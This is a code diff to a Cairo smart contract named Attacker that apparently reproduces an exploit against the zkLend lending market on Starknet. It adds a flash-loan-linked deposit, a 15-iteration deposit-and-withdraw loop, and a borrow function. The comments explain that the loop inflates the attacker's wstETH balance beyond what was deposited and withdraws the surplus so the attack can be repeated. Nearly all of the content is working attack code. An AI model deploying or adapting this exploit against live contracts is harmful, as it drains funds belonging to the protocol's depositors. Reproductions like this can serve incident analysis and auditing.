@@ -9,6 +9,9 @@ pub trait IAttacker<TContractState> {
     fn zklend_flash_callback(
         ref self: TContractState, initiator: ContractAddress, calldata: Span<felt252>,
     );
+    fn deposit(ref self: TContractState);
+    fn deposit_and_withdraw(ref self: TContractState);
+    fn borrow(self: @TContractState, token: ContractAddress, amount: felt252);
 }
 
 
@@ -67,9 +70,48 @@ pub mod Attacker {
 
             let cd_1: felt252 = *calldata.at(0);
             let amount = cd_1.into();
-            println!("Amount {}", amount);
 
             erc20.transfer(market_address, amount);
+        }
+
+        fn deposit(ref self: ContractState) {
+            let market_address: ContractAddress = contract_address_const::<market_address_felt>();
+            let market = IMarketDispatcher { contract_address: market_address };
+            let erc20_address: ContractAddress = contract_address_const::<wstETH_address_felt>();
+            let erc20 = IERC20Dispatcher { contract_address: erc20_address };
+
+            let accumulator = 1827500000000000001;
+            erc20.approve(market_address, 1_000_000_000_000_000_000_000);
+
+            market.deposit(erc20_address, accumulator + 1); // 1 tokens
+
+            // also enable collateral for this token
+            market.enable_collateral(erc20_address);
+        }
+
+        fn deposit_and_withdraw(ref self: ContractState) {
+            let market_address: ContractAddress = contract_address_const::<market_address_felt>();
+            let market = IMarketDispatcher { contract_address: market_address };
+            let erc20_address: ContractAddress = contract_address_const::<wstETH_address_felt>();
+
+            let accumulator = 1827500000000000001;
+            let amount_to_withdraw = 2712865270701095936; // accumulator * 1.5
+
+            for _ in 0..15_u8 {
+                market.deposit(erc20_address, accumulator + accumulator + 2);
+                // At this point the attacker deposited 1.8*3, and got back 2.7
+                // They should have 2.7 left, but their balance is 3.6
+                market.withdraw(erc20_address, amount_to_withdraw);
+            }
+            // eventuall/ withdraw all the extra balance, to be able to repeat the attack
+            market.withdraw(erc20_address, 15_000_000_000_000_000_000);
+        }
+
+        fn borrow(self: @ContractState, token: ContractAddress, amount: felt252) {
+            let market_address: ContractAddress = contract_address_const::<market_address_felt>();
+            let market = IMarketDispatcher { contract_address: market_address };
+
+            market.borrow(token, amount);
         }
     }
 }
